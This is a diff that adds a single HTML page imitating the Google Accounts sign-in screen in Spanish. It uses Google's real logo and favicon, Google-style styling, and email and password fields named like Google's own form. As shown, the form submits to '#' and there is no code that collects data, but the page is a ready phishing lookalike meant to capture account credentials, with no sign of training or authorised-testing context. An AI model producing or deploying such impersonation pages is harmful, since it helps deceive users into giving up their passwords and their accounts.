@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicia sesión: Cuentas de Google</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1024px-Google_%22G%22_logo.svg.png" type="image/png">
+    <style>
+    body {
+        font-family: "Roboto", sans-serif;
+        background-color: #f1f1f1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+    .container {
+        background-color: #fff;
+        padding: 30px;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        width: 320px;
+        text-align: center;
+    }
+    h2 {
+        font-weight: normal;
+        margin-bottom: 5px;
+    }
+    input[type="email"],
+    input[type="password"],
+    input[type="submit"] {
+        width: 100%;
+        padding: 12px;
+        margin: 8px 0;
+        box-sizing: border-box;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        font-size: 16px;
+    }
+    input[type="submit"] {
+        background-color: #4285f4;
+        color: white;
+        border: none;
+        cursor: pointer;
+        font-weight: bold;
+    }
+    input[type="submit"]:hover {
+        background-color: #357ae8;
+    }
+    .forgot-password {
+        text-align: left;
+        font-size: 14px;
+        color: #4285f4;
+        text-decoration: none;
+        margin-top: 5px;
+        display: block;
+        font-weight: bold;
+    }
+    .checkbox-container {
+        text-align: left;
+        margin-top: 10px;
+    }
+    </style>
+</head>
+<body>
+    <div class="container">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google Logo" width="74">
+    <h2>Inicia sesión</h2>
+    <p>Utiliza tu cuenta de Google</p>
+    <form action="#" method="POST" id="loginForm">
+        <input type="email" id="Email" name="email" placeholder="Correo electrónico" required><br>
+        <input type="password" id="Passwd" name="password" placeholder="Introduce tu contraseña" required><br>
+        <div class="checkbox-container">
+            <input type="checkbox" id="showPassword"> Mostrar contraseña
+        </div>
+        <a href="#" class="forgot-password">¿Has olvidado tu contraseña?</a><br>
+        <input type="submit" value="Siguiente">
+        <a href="#" class="forgot-password">¿Has olvidado tu correo electrónico?</a><br>
+    </form>
+    </div>
+</body>
+</html>
